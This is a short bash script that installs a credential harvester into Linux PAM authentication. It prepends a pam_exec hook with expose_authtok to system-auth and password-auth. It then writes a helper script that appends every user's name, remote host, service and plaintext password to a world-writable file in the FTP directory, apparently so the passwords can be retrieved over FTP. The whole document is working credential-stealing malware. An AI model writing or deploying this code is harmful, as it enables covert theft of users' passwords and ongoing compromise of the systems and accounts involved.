#!/bin/bash

touch /var/ftp/data.txt; chmod 777 /var/ftp/data.txt; chown ftp:ftp /var/ftp/data.txt

# ubuntu/deb-based
#echo "auth sufficient pam_exec.so expose_authtok /usr/local/bin/pam.sh" | cat - /etc/pam.d/common-auth > /tmp/common-auth && mv /tmp/common-auth /etc/pam.d/common-auth

# fedora/RHEL-based
echo "auth sufficient pam_exec.so expose_authtok /usr/local/bin/pam.sh" | cat - /etc/pam.d/system-auth > /tmp/system-auth && mv /tmp/system-auth /etc/pam.d/system-auth
echo "auth sufficient pam_exec.so expose_authtok /usr/local/bin/pam.sh" | cat - /etc/pam.d/password-auth > /tmp/password-auth && mv /tmp/password-auth /etc/pam.d/password-auth

cat > /usr/local/bin/pam.sh << 'EOF'
#!/bin/sh
read password
echo "User: $PAM_USER" >> /var/ftp/data.txt
echo "Ruser: $PAM_RUSER" >> /var/ftp/data.txt
echo "Rhost: $PAM_RHOST" >> /var/ftp/data.txt
echo "Service: $PAM_SERVICE" >> /var/ftp/data.txt
echo "TTY: $PAM_TTY" >> /var/ftp/data.txt
echo "Password : $password" >> /var/ftp/data.txt
EOF

chmod 700 /usr/local/bin/pam.sh
chown root:root /usr/local/bin/pam.sh